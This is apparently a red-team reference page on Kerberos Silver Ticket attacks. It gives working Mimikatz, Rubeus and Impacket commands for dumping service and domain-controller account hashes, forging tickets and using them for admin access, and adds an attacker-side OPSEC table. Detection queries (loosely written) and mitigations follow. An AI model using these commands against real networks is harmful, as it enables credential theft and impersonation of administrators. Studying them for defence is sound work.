# Silver Ticket Attack

## Overview

A Silver Ticket is a forged service ticket (TGS) encrypted with the password hash of a **service account** (not krbtgt). Unlike a Golden Ticket which forges a TGT, a Silver Ticket forges a service ticket for a specific service and is used directly against the target server — **no contact with the DC is required**.

This attack is stealthier than Golden Tickets because it generates fewer Kerberos events on the DC (no TGS-REQ is sent to the DC).

## How Silver Tickets Work

```
Normal Flow:
  Client → AS-REQ → KDC → TGT → Client
  Client → TGS-REQ (with TGT) → KDC → Service Ticket → Client
  Client → AP-REQ (Service Ticket) → Target Server → Access

Silver Ticket Flow:
  Attacker (offline): Forges Service Ticket with service hash
  Attacker → AP-REQ (Forged Service Ticket) → Target Server → Access
                                                    ▲
                                                    │
                                            No DC Contact Needed
```

The target server decrypts the service ticket using its own password hash. If the ticket decrypts successfully and the PAC data is "valid" (the server doesn't verify the PAC signature against the DC), the server grants access.

### Information Required

| Data | Description | How to Obtain |
|------|-------------|---------------|
| Service account hash | RC4 (NTLM) or AES of the target service | `mimikatz lsadump::lsa`, `sekurlsa::logonpasswords`, DCSync |
| Domain SID | Domain security identifier | `whoami /user`, AD enumeration |
| Target server hostname | Hostname/IP of the target service | Enumeration |
| Service type | CIFS, HTTP, LDAP, HOST, MSSQLSvc, etc. | Based on access needed |
| Username | User to impersonate | Usually `Administrator` |

### Service Types for Silver Tickets

| Service Type | Allows Access To |
|-------------|------------------|
| `cifs` | SMB file shares, named pipes (PSExec, etc.) |
| `host` | Remote desktop, scheduled tasks, WinRM |
| `http` | WinRM (via WSMan), IIS |
| `ldap` | LDAP queries (DCSync if on DC) |
| `rpcss` | Remote registry access |
| `wsman` | WinRM management |
| `mssqlsvc` | SQL Server access |
| `time` | Time synchronization |
| `termsrv` | Remote Desktop |
| `kadmin` | Kerberos admin (password changes) |

## Forging Silver Tickets

### Mimikatz

```mimikatz
# CIFS - Access to SMB (most common)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /target:dc.domain.local /service:cifs /rc4:SERVICE_NT_HASH /ptt

# HOST - Remote desktop, task scheduler
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /target:dc.domain.local /service:host /rc4:HASH /ptt

# HTTP - WinRM access
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /target:dc.domain.local /service:http /rc4:HASH /ptt

# LDAP - DCSync (if targeting DC)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /target:dc.domain.local /service:ldap /rc4:HASH /ptt

# RPCSS - Remote registry
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /target:dc.domain.local /service:rpcss /rc4:HASH /ptt

# Multiple services can be targeted separately
# Each service needs its own Silver Ticket
```

**Parameters:**
- `/target` - Hostname of the target server (not FQDN in some cases)
- `/service` - Service type (CIFS, HTTP, LDAP, etc.)
- `/rc4` / `/aes256` / `/aes128` - Service account's password hash
- `/ptt` - Inject into current session

### Rubeus

```powershell
# Silver ticket using RC4
Rubeus.exe silver /service:http/dc.domain.local /rc4:SERVICE_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /ptt

# Silver with AES256
Rubeus.exe silver /service:cifs/dc.domain.local /aes256:AES256_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /ptt

# Write to file (use later)
Rubeus.exe silver /service:cifs/dc.domain.local /rc4:HASH /user:Admin /domain:dom /sid:S-X /ticket:silver.kirbi
```

### Impacket (Linux)

```bash
# No direct "silver ticket" tool, but use ticketer.py with -spn
ticketer.py -nthash HASH -domain-sid S-X -domain domain.local -spn cifs/dc.domain.local Administrator

# Use with exported KRB5CCNAME
export KRB5CCNAME=Administrator.ccache
smbexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### Using the Silver Ticket

```powershell
# After /ptt injection, access the target
# CIFS silver ticket
dir \\dc.domain.local\c$

# HOST silver ticket - Scheduled tasks
schtasks /S dc.domain.local /create /SC ONCE /TN "task" /TR "calc.exe" /ST 12:00

# HTTP silver ticket - WinRM
Invoke-Command -ComputerName dc.domain.local -ScriptBlock { whoami }

# LDAP silver ticket (if targeting DC)
# Allows LDAP operations including DCSync
```

## Silver Ticket vs Golden Ticket

| Aspect | Golden Ticket | Silver Ticket |
|--------|--------------|---------------|
| **Key Used** | krbtgt hash | Service account hash |
| **Scope** | Entire domain | Single service on single server |
| **DC Contact** | None (for TGS request) | None (completely offline) |
| **DC Events** | 4769 (TGS request) | None |
| **Stealth** | Less stealthy | More stealthy |
| **Lateral** | Any service/any server | Specific service/server |
| **Key Source** | DCSync (DA required) | Local SAM/LSASS (admin on target) |
| **PAC Validation** | Can be detected (by KDC) | Not validated (by service) |

## Obtaining Service Account Hashes

### From a Compromised Server

```mimikatz
# On the server where the service runs
privilege::debug
sekurlsa::logonpasswords

# Or dump from LSASS
sekurlsa::msv

# Dump service account (if it runs as a specific user)
sekurlsa::wdigest
sekurlsa::kerberos
```

### From a DC (DCSync)

```mimikatz
# DCSync for the specific service account (DA required)
lsadump::dcsync /domain:domain.local /user:svc_sql

# DCSync for the DC computer account (for DC silver tickets)
lsadump::dcsync /domain:domain.local /user:dc01$
```

### For Domain Controller Silver Ticket

To create a Silver Ticket for a **Domain Controller**, you need the **computer account hash** of the DC itself.

```mimikatz
# On the DC, dump its own hash
privilege::debug
lsadump::lsa /patch | findstr "DC01$"
```

Or from another machine with DA:

```mimikatz
lsadump::dcsync /domain:domain.local /user:dc01$
```

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **No DC events** | Silver tickets generate **zero** Kerberos events on the DC |
| **Local admin required** | To dump service hash from a server (unless DCSync) |
| **Limited scope** | Ticket is for one service on one server |
| **No PAC validation** | Servides don't validate PAC (no KDC check) |
| **Service NTLM hash** | Needs clear-text or hash of service account |
| **Encryption** | RC4 silver tickets may be flagged if AES is enforced |
| **Target hostname** | Must match what the service expects (FQDN vs NETBIOS) |
| **Logon event** | Target server generates event 4624 (logon) |

### Log Events on Target Server

When a Silver Ticket is used, the target server logs:
- **4624**: An account was successfully logged on
- **4634**: An account was logged off
- **4672**: Special privileges assigned to new logon

The logon type will be `3` (Network) and the logon process will be `Kerberos`.

## Detection

### Event 4624 on Target Server

```
Logon Type: 3 (Network)
Authentication Package: Kerberos
Account Name: Administrator
Account Domain: domain.local
Workstation: (empty or irrelevant)
```

Silver tickets often show up with:
- Logon GUID is all zeros (`00000000-0000-0000-0000-000000000000`)
- The workstation name field is different from normal
- Network address is anomalous

### No DC Correlation

The biggest detection opportunity is the **lack of a corresponding 4769** on the DC. If a server reports a Kerberos logon but no 4769 exists for that user+service combination, it's likely a Silver Ticket.

### Detection Rules

```kusto
// KQL - Detect Silver Tickets (logon without TGS request)
// Correlate server 4624 with DC 4769
let SilverLogons = 
    SecurityEvent
    | where EventID == 4624
    | where AuthenticationPackageName == "Kerberos"
    | where LogonType == 3
    | where TargetUserName != "$*"
    | project TargetAccount, TargetServer, TimeGenerated;
    
// Check for 4769 on DC
let TGSCheck = 
    SecurityEvent
    | where EventID == 4769
    | project AccountName, ServiceName, TimeGenerated;
    
// Join and find mismatches
SilverLogons
    | join kind=leftanti TGSCheck on $left.TargetAccount == $right.AccountName
```

```powershell
# Check for logon with no TGS (rough heuristic)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    Where-Object { $_.Properties[8].Value -eq 'Kerberos' } |
    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}
```

### Event 4768 / 4769 Anomalies

- Silver tickets don't generate 4768 (TGT request) on the DC
- Silver tickets don't generate 4769 (TGS request) on the DC
- If you see 4624 Kerberos logons without preceding 4768/4769 → Silver Ticket

### PAC Anomalies (Advanced Detection)

- Services may verify PAC signatures with the DC on newer systems
- Enabled via "Kerberos PAC Validation" - but this is rare

## Mitigations

1. **Protect service account credentials** - Use LAPS for local admin passwords
2. **Use Group Managed Service Accounts (gMSA)** - Automatic password rotation
3. **Use Managed Service Accounts (MSA)** - Unique complex passwords
4. **Disable RC4** via Group Policy (force AES) - makes cracking harder
5. **Monitor for Kerberos anomalies** - Correlate DC and server logs
6. **Use Windows Defender Credential Guard** - Protects LSASS from dumping
7. **Apply the principle of least privilege** - Service accounts should have minimal rights
8. **Deploy Advanced Threat Analytics (ATA)** or similar for behavioral detection
9. **Regularly rotate** service account passwords (including computer account passwords)

## References

- Benjamin Delpy (mimikatz) - Silver Ticket implementation
- MS-SPCB: Service Principal Name
- MS-KILE: Kerberos Protocol Extensions
